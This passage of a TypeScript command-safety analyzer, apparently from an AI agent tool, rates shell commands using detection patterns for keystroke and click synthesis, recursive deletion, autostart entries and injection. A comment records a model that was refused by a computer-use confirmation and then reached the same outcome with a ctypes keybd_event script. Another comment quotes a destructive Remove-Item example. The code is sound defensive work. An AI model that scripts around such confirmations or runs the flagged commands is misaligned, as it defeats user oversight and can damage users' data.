  /^git\s+(status|log|diff|branch|fetch|pull|show|stash|remote|tag)(\s|$)/,
  /^code(\s|$)/,
  /^open(\s|$)/,
];

/**
 * Analyze a single (non-compound) command segment.
 * Internal helper — does NOT split on compound operators.
 */
/**
 * A shell command that types, clicks, or brings a window forward.
 *
 * Computer Use asks before it sends a message, deletes something or changes a
 * setting. A script that drives the same window reaches the same outcome with
 * none of that. Measured on 2026-09-14: refused by Computer Use, the model
 * wrote a Python ctypes script calling `keybd_event` and got there anyway.
 *
 * This is a confirmation, in the same class as the `rundll32` and
 * `mshta vbscript:` entries — all of them are avoidable by someone who wants
 * to, and none of them is a boundary. What it buys is that a command about to
 * type on the user's keyboard says so before it runs.
 *
 * Both platforms' spellings are listed together because the command names
 * identify themselves; a macOS-only `xdotool` on Windows is still a command
 * asking to drive the screen.
 */
function screenDrivingCommand(segment: string): string | null {
  const t = getI18n().toolResult.commandSafety;
  // The identifier has to be used, not merely mentioned: a call bracket, an
  // attribute dot, or a .NET member access. A folder called
  // `sendinput-notes` is a file name, and asking about it would train the
  // user to click through the very prompt this exists to raise.
  const called = /\b(keybd_event|mouse_event|SendInput|SendKeys|pyautogui|pynput)\s*[(.\]]|::\s*(SendWait|SendInput)\b/i;
  if (called.test(segment)) return t.dangerSynthesizeInput;
  // Standalone tools, which appear as the command word rather than a call.
  if (/(^|[;&|]\s*)(sudo\s+)?(xdotool|ydotool|cliclick)\s/i.test(segment)) {
    return t.dangerSynthesizeInput;
  }
  if (/\b(AppActivate|SetForegroundWindow)\s*\(/i.test(segment)) return t.dangerDriveWindow;
  if (/osascript[\s\S]*\b(keystroke|key code)\b/i.test(segment)) return t.dangerSynthesizeInput;
  if (/osascript[\s\S]*System Events[\s\S]*\bclick\b/i.test(segment)) return t.dangerDriveWindow;
  return null;
}

function analyzeSegment(segment: string): CommandAnalysis {
  const trimmed = segment.trim();
  const normalized = normalizeCommand(trimmed);
  const readOnly = isReadOnlyCommand(trimmed);

  // Typing and clicking is checked before the safe list, because the safe
  // list matches on the program being run and these commands hide inside a
  // program that is ordinarily fine: `python` and `powershell` are both on it,
  // so `python -c "import pyautogui; pyautogui.click(…)"` would short-circuit
  // to safe on its first word.
  const drivesTheScreen = screenDrivingCommand(trimmed);
  if (drivesTheScreen) {
    return { level: 'danger', reason: drivesTheScreen, readOnly: false };
  }

  // Build platform-aware safe pattern list
  const safePatterns = isWindows() ? [...SAFE_PATTERNS, ...WIN_SAFE_PATTERNS] : SAFE_PATTERNS;

  // Safe pattern check: only applies to the segment in isolation
  for (const pattern of safePatterns) {
    if (pattern.test(trimmed)) {
      return { level: 'safe', reason: '', readOnly };
    }
  }

  // Check dangerous patterns in descending severity order. Resolve the tiered
  // dictionaries once per segment (they rebuild their regex arrays + re-read
  // i18n on each call), not once per severity level.
  const win = isWindows();
  const dangerousPatterns = getDangerousPatterns();
  const winDangerousPatterns = win ? getWinDangerousPatterns() : null;
  const levels: Array<Exclude<DangerLevel, 'safe'>> = ['block', 'danger', 'warn'];
  for (const level of levels) {
    if (level === 'danger' && hasRmRecursiveOption(trimmed)) {
      return {
        level,
        reason: getI18n().toolResult.commandSafety.dangerRmRf,
        matchedPattern: 'rm recursive option (-r/-R/--recursive)',
        readOnly: false,
      };
    }

    const patterns = winDangerousPatterns
      ? [...dangerousPatterns[level], ...winDangerousPatterns[level]]
      : dangerousPatterns[level];
    for (const { pattern, reason } of patterns) {
      if (pattern.test(trimmed) || pattern.test(normalized)) {
        return { level, reason, matchedPattern: pattern.source, readOnly: false };
      }
    }
  }

  return { level: 'safe', reason: '', readOnly };
}

/**
 * Analyze a command string and return its danger level.
 *
 * For compound commands (joined by &&, ||, ;, |), each segment is analyzed
 * independently and the highest danger level across all segments is returned.
 * This prevents safe-pattern short-circuits from masking dangerous sub-commands
 * (e.g. `cd Desktop; Remove-Item * -Recurse -Force` must NOT be classified as safe).
 */
export function analyzeCommand(command: string): CommandAnalysis {
  const trimmedCommand = command.trim();

  // Compute read-only status for the full command upfront
  const readOnly = isReadOnlyCommand(trimmedCommand);

  // Start-at-sign-in locations: a red line in every mode, ahead of the
  // injection check (which would only rate the command 'danger').
  const autostart = autostartCommand(trimmedCommand);
  if (autostart?.level === 'block') return { level: 'block', reason: autostart.reason, readOnly: false };
  const analysis = analyzeAllSegments(trimmedCommand, readOnly);
  // Taking an autostart entry away asks at least as a warning.
  if (autostart && compareDanger(autostart.level, analysis.level) > 0) {
    return { level: autostart.level, reason: autostart.reason, readOnly: false };
  }
  return analysis;
}

function analyzeAllSegments(trimmedCommand: string, readOnly: boolean): CommandAnalysis {

  // Injection check runs on the full command before any splitting
  const injectionCheck = hasCommandInjection(trimmedCommand);
  if (injectionCheck.injected) {
    return { level: 'danger', reason: injectionCheck.reason, readOnly: false };
  }

  // Split into segments to prevent safe-pattern short-circuit on compound commands
  const segments = splitCompoundCommand(trimmedCommand);

  if (segments.length === 1) {
    // Single segment — use full readOnly from outer call (more accurate)
    const result = analyzeSegment(segments[0]);
    return { ...result, readOnly: result.level === 'safe' ? readOnly : false };
  }

  // Compound command: analyze each segment, return the worst result
  let worst: CommandAnalysis = { level: 'safe', reason: '', readOnly };
  for (const seg of segments) {
    const result = analyzeSegment(seg);
    if (compareDanger(result.level, worst.level) > 0) {
      worst = result;
    }
  }
  // A compound command with any dangerous segment is not read-only
  return { ...worst, readOnly: worst.level === 'safe' ? readOnly : false };
}

/**
 * Get a human-readable description for a danger level
 */
export function getDangerLevelLabel(level: DangerLevel): string {
  const t = getI18n().toolResult.commandSafety;
  switch (level) {
    case 'block':
      return t.levelBlock;
    case 'danger':
      return t.levelDanger;
    case 'warn':
      return t.levelWarn;
    case 'safe':
      return t.levelSafe;
  }
}
